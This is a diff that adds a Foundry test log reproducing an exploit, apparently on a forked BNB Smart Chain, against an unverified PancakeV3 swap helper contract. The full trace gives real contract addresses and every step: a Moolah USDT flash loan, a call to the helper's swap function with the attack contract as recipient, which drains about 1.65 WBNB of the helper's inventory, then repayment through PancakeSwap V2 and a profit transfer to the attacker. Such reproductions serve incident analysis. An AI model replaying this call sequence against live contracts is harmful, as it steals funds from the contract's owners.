@@ -1,0 +1,199 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/PancakeV3SwapHelper_exp.sol:PancakeV3SwapHelperExploitTest
+[PASS] testExploit() (gas: 378161)
+Logs:
+  Attacker Before exploit BNB Balance: 0.000000000000000000
+  Victim WBNB inventory drained: 1.651021225164017256
+  Attacker BNB profit before gas: 1.648925501026157960
+  Attacker After exploit BNB Balance: 1.648925501026157960
+
+Traces:
+  [1090971] PancakeV3SwapHelperExploitTest::setUp()
+    ├─ [0] VM::createSelectFork("bsc", 0x70bc4ff8439f74d26d454a53e9a135ac3659a958aa3462218d0db7ed55cf5104)
+    │   └─ ← [Return] 0
+    ├─ [1003039] → new PancakeV3SwapHelperAttack@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   └─ ← [Return] 5010 bytes of code
+    ├─ [0] VM::label(Unverified swap helper: [0x222C8580eaA32f6f5a728bda0129CFA485eCc52D], "Unverified swap helper")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(USDT: [0x55d398326f99059fF775485246999027B3197955], "USDT")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], "WBNB")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Moolah: [0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C], "Moolah")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Pancake V2 Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], "Pancake V2 Router")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Attacker: [0x804D75DB19Ef595FD7F540262FAFa2FdA3E7d101], "Attacker")
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+  [477967] PancakeV3SwapHelperExploitTest::testExploit()
+    ├─ [0] VM::deal(Attacker: [0x804D75DB19Ef595FD7F540262FAFa2FdA3E7d101], 0)
+    │   └─ ← [Return]
+    ├─ emit log_named_decimal_uint(key: "Attacker Before exploit BNB Balance", val: 0, decimals: 18)
+    ├─ [2534] WBNB::balanceOf(Unverified swap helper: [0x222C8580eaA32f6f5a728bda0129CFA485eCc52D]) [staticcall]
+    │   └─ ← [Return] 1651021225164017256 [1.651e18]
+    ├─ [0] VM::assertEq(1651021225164017256 [1.651e18], 1651021225164017256 [1.651e18], "victim inventory changed at attack tx") [staticcall]
+    │   └─ ← [Return]
+    ├─ [430644] PancakeV3SwapHelperAttack::attack(1651021225164017256 [1.651e18])
+    │   ├─ [426366] Moolah::flashLoan(USDT: [0x55d398326f99059fF775485246999027B3197955], 3651021225164017256 [3.651e18], 0x00000000000000000000000000000000000000000000000016e99b0e8a880e68)
+    │   │   ├─ [421535] 0x9321587EA0DC8247f8F03E8696C047b2713bB79A::flashLoan(USDT: [0x55d398326f99059fF775485246999027B3197955], 3651021225164017256 [3.651e18], 0x00000000000000000000000000000000000000000000000016e99b0e8a880e68) [delegatecall]
+    │   │   │   ├─ emit FlashLoan(param0: PancakeV3SwapHelperAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param1: USDT: [0x55d398326f99059fF775485246999027B3197955], param2: 3651021225164017256 [3.651e18])
+    │   │   │   ├─ [29971] USDT::transfer(PancakeV3SwapHelperAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 3651021225164017256 [3.651e18])
+    │   │   │   │   ├─ emit Transfer(from: Moolah: [0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C], to: PancakeV3SwapHelperAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], amount: 3651021225164017256 [3.651e18])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xc8737a1a7dc859e693c17e576af6a39e8f99898023aaf88112357c0c933ab7f1: 0x000000000000000000000000000000000000000000023ebfa8bc74ee7346da21 → 0x000000000000000000000000000000000000000000023ebf76116c7899f6cbb9
+    │   │   │   │   │   @ 0xe135b438163c07f06263f9c7a911682b41bdc632d00c89620a1db653a7041b6a: 0 → 0x00000000000000000000000000000000000000000000000032ab0875d9500e68
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [370782] PancakeV3SwapHelperAttack::onMoolahFlashLoan(3651021225164017256 [3.651e18], 0x00000000000000000000000000000000000000000000000016e99b0e8a880e68)
+    │   │   │   │   ├─ [24562] USDT::approve(Unverified swap helper: [0x222C8580eaA32f6f5a728bda0129CFA485eCc52D], 1651021225164017256 [1.651e18])
+    │   │   │   │   │   ├─ emit Approval(owner: PancakeV3SwapHelperAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: Unverified swap helper: [0x222C8580eaA32f6f5a728bda0129CFA485eCc52D], amount: 1651021225164017256 [1.651e18])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x8917abda1ce0cefce1373ff01cc7d125919400551be76a67a1e9b50f43445971: 0 → 0x00000000000000000000000000000000000000000000000016e99b0e8a880e68
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [180900] Unverified swap helper::swapTokenForBNBWithRecipient(USDT: [0x55d398326f99059fF775485246999027B3197955], 100, 1651021225164017256 [1.651e18], 1, 1790152648 [1.79e9], PancakeV3SwapHelperAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   │   │   │   │   ├─ [2675] 0x0BFbCF9fa4f9C56B0F40a671Ad40E0805A091865::getPool(USDT: [0x55d398326f99059fF775485246999027B3197955], WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 100) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x172fcD41E0913e95784454622d1c3724f546f849
+    │   │   │   │   │   ├─ emit PoolUsed(param0: 0x172fcD41E0913e95784454622d1c3724f546f849)
+    │   │   │   │   │   ├─ [27934] USDT::transferFrom(PancakeV3SwapHelperAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], Unverified swap helper: [0x222C8580eaA32f6f5a728bda0129CFA485eCc52D], 1651021225164017256 [1.651e18])
+    │   │   │   │   │   │   ├─ emit Transfer(from: PancakeV3SwapHelperAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: Unverified swap helper: [0x222C8580eaA32f6f5a728bda0129CFA485eCc52D], amount: 1651021225164017256 [1.651e18])
+    │   │   │   │   │   │   ├─ emit Approval(owner: PancakeV3SwapHelperAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: Unverified swap helper: [0x222C8580eaA32f6f5a728bda0129CFA485eCc52D], amount: 0)
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0x727b1822d4936d8b8d896f5e017eed4973adcfa1183615e43a58f367de58bf9a: 0 → 0x00000000000000000000000000000000000000000000000016e99b0e8a880e68
+    │   │   │   │   │   │   │   @ 0x8917abda1ce0cefce1373ff01cc7d125919400551be76a67a1e9b50f43445971: 0x00000000000000000000000000000000000000000000000016e99b0e8a880e68 → 0
+    │   │   │   │   │   │   │   @ 0xe135b438163c07f06263f9c7a911682b41bdc632d00c89620a1db653a7041b6a: 0x00000000000000000000000000000000000000000000000032ab0875d9500e68 → 0x0000000000000000000000000000000000000000000000001bc16d674ec80000
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [24562] USDT::approve(0x172fcD41E0913e95784454622d1c3724f546f849, 1651021225164017256 [1.651e18])
+    │   │   │   │   │   │   ├─ emit Approval(owner: Unverified swap helper: [0x222C8580eaA32f6f5a728bda0129CFA485eCc52D], spender: 0x172fcD41E0913e95784454622d1c3724f546f849, amount: 1651021225164017256 [1.651e18])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0xca07fc49ac414c82d81139ae25bc823288c7d53c9d62697552628164c9b4dfd4: 0 → 0x00000000000000000000000000000000000000000000000016e99b0e8a880e68
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [74439] 0x172fcD41E0913e95784454622d1c3724f546f849::swap(Unverified swap helper: [0x222C8580eaA32f6f5a728bda0129CFA485eCc52D], true, 1651021225164017256 [1.651e18], 4295128740 [4.295e9], 0x00000000000000000000000055d398326f99059ff775485246999027b3197955)
+    │   │   │   │   │   │   ├─ [2540] 0xc1B45EC6ed9B65D76a49Ff0c38794d1dAa135050::accumulateReward(1790152648 [1.79e9])
+    │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   ├─ [10862] WBNB::transfer(Unverified swap helper: [0x222C8580eaA32f6f5a728bda0129CFA485eCc52D], 2089397784051482 [2.089e15])
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x172fcD41E0913e95784454622d1c3724f546f849, to: Unverified swap helper: [0x222C8580eaA32f6f5a728bda0129CFA485eCc52D], amount: 2089397784051482 [2.089e15])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0xed93f154226bea5228a538ddd7f6e1b8d878a5d95dc495daa8ac4679fe6b0986: 0x0000000000000000000000000000000000000000000000d4ebe431c13dbe9a67 → 0x0000000000000000000000000000000000000000000000d4ebdcc57569081b4d
+    │   │   │   │   │   │   │   │   @ 0x8cc363bd0957d8e3c358c9ff0d8d861aa59da33e423234ccc3d2c6746ec28667: 0x00000000000000000000000000000000000000000000000016e99b0e8a880e68 → 0x00000000000000000000000000000000000000000000000016f1075a5f3e8d82
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ [2531] USDT::balanceOf(0x172fcD41E0913e95784454622d1c3724f546f849) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 10250173871687507682552334 [1.025e25]
+    │   │   │   │   │   │   ├─ [9440] Unverified swap helper::pancakeV3SwapCallback(1651021225164017256 [1.651e18], -2089397784051482 [-2.089e15], 0x00000000000000000000000055d398326f99059ff775485246999027b3197955)
+    │   │   │   │   │   │   │   ├─ [6071] USDT::transfer(0x172fcD41E0913e95784454622d1c3724f546f849, 1651021225164017256 [1.651e18])
+    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: Unverified swap helper: [0x222C8580eaA32f6f5a728bda0129CFA485eCc52D], to: 0x172fcD41E0913e95784454622d1c3724f546f849, amount: 1651021225164017256 [1.651e18])
+    │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   @ 0x727b1822d4936d8b8d896f5e017eed4973adcfa1183615e43a58f367de58bf9a: 0x00000000000000000000000000000000000000000000000016e99b0e8a880e68 → 0
+    │   │   │   │   │   │   │   │   │   @ 0xae2d979d9ce1e2f2bbd9132b89a629434ebf514f80780479b5646bf3e4d9206e: 0x000000000000000000000000000000000000000000087a8f09fc07174b646a0e → 0x000000000000000000000000000000000000000000087a8f20e5a225d5ec7876
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   ├─ emit CallbackPaid(param0: DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38], param1: 0x172fcD41E0913e95784454622d1c3724f546f849, param2: USDT: [0x55d398326f99059fF775485246999027B3197955], param3: 1651021225164017256 [1.651e18])
+    │   │   │   │   │   │   │   └─ ← [Return]
+    │   │   │   │   │   │   ├─ [531] USDT::balanceOf(0x172fcD41E0913e95784454622d1c3724f546f849) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 10250175522708732846569590 [1.025e25]
+    │   │   │   │   │   │   ├─ emit Swap(param0: Unverified swap helper: [0x222C8580eaA32f6f5a728bda0129CFA485eCc52D], param1: Unverified swap helper: [0x222C8580eaA32f6f5a728bda0129CFA485eCc52D], param2: 1651021225164017256 [1.651e18], param3: -2089397784051482 [-2.089e15], param4: 2818613529656947153662211905 [2.818e27], param5: 3243284634095309034116534 [3.243e24], param6: -66726 [-6.672e4], param7: 54483700430412 [5.448e13], param8: 0)
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 2: 0x000000000000000000000000000000061dace88051cb6446c3ca55eda15d806e → 0x000000000000000000000000000000061dace880774ba242ed836388b9e9730c
+    │   │   │   │   │   │   │   @ 4: 0x0000000000000000084af4920cf0d7420000000000000019637ef8bb7c3ed98f → 0x0000000000000000084af4920cf0d7420000000000000019637f2a48f5db0fdb
+    │   │   │   │   │   │   │   @ 0: 0x000000119411940fd0fefb5a0000000000000000091b80a46124fc01f3c093bb → 0x000000119411940fd0fefb5a0000000000000000091b80a19cd065c5df017741
+    │   │   │   │   │   │   └─ ← [Return] 1651021225164017256 [1.651e18], -2089397784051482 [-2.089e15]
+    │   │   │   │   │   ├─ [10532] WBNB::withdraw(1651021225164017256 [1.651e18])
+    │   │   │   │   │   │   ├─ [1392] Unverified swap helper::fallback{value: 1651021225164017256}()
+    │   │   │   │   │   │   │   ├─ emit BNBReceived(: WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], : 1651021225164017256 [1.651e18])
+    │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   ├─ emit Withdrawal(src: Unverified swap helper: [0x222C8580eaA32f6f5a728bda0129CFA485eCc52D], wad: 1651021225164017256 [1.651e18])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0x8cc363bd0957d8e3c358c9ff0d8d861aa59da33e423234ccc3d2c6746ec28667: 0x00000000000000000000000000000000000000000000000016f1075a5f3e8d82 → 0x00000000000000000000000000000000000000000000000000076c4bd4b67f1a
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   ├─ [55] PancakeV3SwapHelperAttack::receive{value: 1651021225164017256}()
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   ├─ emit SwapSuccess(param0: 0x172fcD41E0913e95784454622d1c3724f546f849, param1: 1651021225164017256 [1.651e18], param2: -2089397784051482 [-2.089e15])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0xb063e1925637c67ae4b8c357200d608237fd7aca55bda4720d99193424049122: 0 → 1
+    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000016e99b0e8a880e68
+    │   │   │   │   ├─ [23974] WBNB::deposit{value: 50000000000000000}()
+    │   │   │   │   │   ├─ emit Deposit(dst: PancakeV3SwapHelperAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], wad: 50000000000000000 [5e16])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60: 0 → 0x00000000000000000000000000000000000000000000000000b1a2bc2ec50000
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [24420] WBNB::approve(Pancake V2 Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   │   ├─ emit Approval(owner: PancakeV3SwapHelperAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: Pancake V2 Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x6c07e79148452d63a92847675cfe62442cc4fcbb6b98ceb991e587f7e050fc0d: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [54059] Pancake V2 Router::swapTokensForExactTokens(1651021225164017256 [1.651e18], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77], [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0x55d398326f99059fF775485246999027B3197955], PancakeV3SwapHelperAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1790152648 [1.79e9])
+    │   │   │   │   │   ├─ [2893] 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE::getReserves() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 42609966095485659637415743 [4.26e25], 53951749871200146842466 [5.395e22], 1790152648 [1.79e9]
+    │   │   │   │   │   ├─ [8225] WBNB::transferFrom(PancakeV3SwapHelperAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE, 2095724137859296 [2.095e15])
+    │   │   │   │   │   │   ├─ emit Transfer(from: PancakeV3SwapHelperAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE, amount: 2095724137859296 [2.095e15])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60: 0x00000000000000000000000000000000000000000000000000b1a2bc2ec50000 → 0x00000000000000000000000000000000000000000000000000aa30af61fc3720
+    │   │   │   │   │   │   │   @ 0x65a91b743eebb93754974b0d76ae6fbcc9c7843adbbd90f71368692e5c22fe4d: 0x000000000000000000000000000000000000000000000b6cbaefc33c1ba86362 → 0x000000000000000000000000000000000000000000000b6cbaf73548e8712c42
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [31964] 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE::swap(1651021225164017256 [1.651e18], 0, PancakeV3SwapHelperAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x)
+    │   │   │   │   │   │   ├─ [8071] USDT::transfer(PancakeV3SwapHelperAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1651021225164017256 [1.651e18])
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE, to: PancakeV3SwapHelperAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], amount: 1651021225164017256 [1.651e18])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0xe135b438163c07f06263f9c7a911682b41bdc632d00c89620a1db653a7041b6a: 0x0000000000000000000000000000000000000000000000001bc16d674ec80000 → 0x00000000000000000000000000000000000000000000000032ab0875d9500e68
+    │   │   │   │   │   │   │   │   @ 0xba08221f8673e7bcd34c1b8c4689a983ae464d35addf83dda4fe5d5546a79b0d: 0x000000000000000000000000000000000000000000233f02e3f8a8503fccff3f → 0x000000000000000000000000000000000000000000233f02cd0f0d41b544f0d7
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ [531] USDT::balanceOf(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 42609964444464434473398487 [4.26e25]
+    │   │   │   │   │   │   ├─ [534] WBNB::balanceOf(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 53951751966924284701762 [5.395e22]
+    │   │   │   │   │   │   ├─ emit Sync(reserve0: 42609964444464434473398487 [4.26e25], reserve1: 53951751966924284701762 [5.395e22])
+    │   │   │   │   │   │   ├─ emit Swap(sender: Pancake V2 Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 0, amount1In: 2095724137859296 [2.095e15], amount0Out: 1651021225164017256 [1.651e18], amount1Out: 0, to: PancakeV3SwapHelperAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 8: 0x6ab38fc8000000000b6cbaefc33c1ba86362000000233f02e3f8a8503fccff3f → 0x6ab38fc8000000000b6cbaf73548e8712c42000000233f02cd0f0d41b544f0d7
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   └─ ← [Return] [2095724137859296 [2.095e15], 1651021225164017256 [1.651e18]]
+    │   │   │   │   ├─ [534] WBNB::balanceOf(PancakeV3SwapHelperAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 47904275862140704 [4.79e16]
+    │   │   │   │   ├─ [9195] WBNB::withdraw(47904275862140704 [4.79e16])
+    │   │   │   │   │   ├─ [55] PancakeV3SwapHelperAttack::receive{value: 47904275862140704}()
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   ├─ emit Withdrawal(src: PancakeV3SwapHelperAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], wad: 47904275862140704 [4.79e16])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60: 0x00000000000000000000000000000000000000000000000000aa30af61fc3720 → 0
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [24562] USDT::approve(Moolah: [0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C], 3651021225164017256 [3.651e18])
+    │   │   │   │   │   ├─ emit Approval(owner: PancakeV3SwapHelperAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: Moolah: [0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C], amount: 3651021225164017256 [3.651e18])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x1e3d5198e27786dda997ce8795b8702fbdd0cc9c5742187668f9b96c1a34bb5d: 0 → 0x00000000000000000000000000000000000000000000000032ab0875d9500e68
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [0] Attacker::fallback{value: 1648925501026157960}()
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [6034] USDT::transferFrom(PancakeV3SwapHelperAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], Moolah: [0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C], 3651021225164017256 [3.651e18])
+    │   │   │   │   ├─ emit Transfer(from: PancakeV3SwapHelperAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: Moolah: [0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C], amount: 3651021225164017256 [3.651e18])
+    │   │   │   │   ├─ emit Approval(owner: PancakeV3SwapHelperAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: Moolah: [0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C], amount: 0)
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xc8737a1a7dc859e693c17e576af6a39e8f99898023aaf88112357c0c933ab7f1: 0x000000000000000000000000000000000000000000023ebf76116c7899f6cbb9 → 0x000000000000000000000000000000000000000000023ebfa8bc74ee7346da21
+    │   │   │   │   │   @ 0xe135b438163c07f06263f9c7a911682b41bdc632d00c89620a1db653a7041b6a: 0x00000000000000000000000000000000000000000000000032ab0875d9500e68 → 0
+    │   │   │   │   │   @ 0x1e3d5198e27786dda997ce8795b8702fbdd0cc9c5742187668f9b96c1a34bb5d: 0x00000000000000000000000000000000000000000000000032ab0875d9500e68 → 0
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Return]
+    │   │   └─ ← [Return]
+    │   └─ ← [Stop]
+    ├─ emit log_named_decimal_uint(key: "Victim WBNB inventory drained", val: 1651021225164017256 [1.651e18], decimals: 18)
+    ├─ emit log_named_decimal_uint(key: "Attacker BNB profit before gas", val: 1648925501026157960 [1.648e18], decimals: 18)
+    ├─ [0] VM::assertEq(1648925501026157960 [1.648e18], 1648925501026157960 [1.648e18], "attacker BNB profit differs from tx trace") [staticcall]
+    │   └─ ← [Return]
+    ├─ [531] USDT::balanceOf(PancakeV3SwapHelperAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::assertEq(0, 0, "Moolah loan was not fully repaid") [staticcall]
+    │   └─ ← [Return]
+    ├─ [534] WBNB::balanceOf(PancakeV3SwapHelperAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::assertEq(0, 0, "leftover WBNB was not unwrapped") [staticcall]
+    │   └─ ← [Return]
+    ├─ [534] WBNB::balanceOf(Unverified swap helper: [0x222C8580eaA32f6f5a728bda0129CFA485eCc52D]) [staticcall]
+    │   └─ ← [Return] 2089397784051482 [2.089e15]
+    ├─ [0] VM::assertEq(2089397784051482 [2.089e15], 2089397784051482 [2.089e15], "victim should retain only the actual V3 swap output") [staticcall]
+    │   └─ ← [Return]
+    ├─ emit log_named_decimal_uint(key: "Attacker After exploit BNB Balance", val: 1648925501026157960 [1.648e18], decimals: 18)
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 3.13s (7.25ms CPU time)
+
+Ran 1 test suite in 3.90s (3.13s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
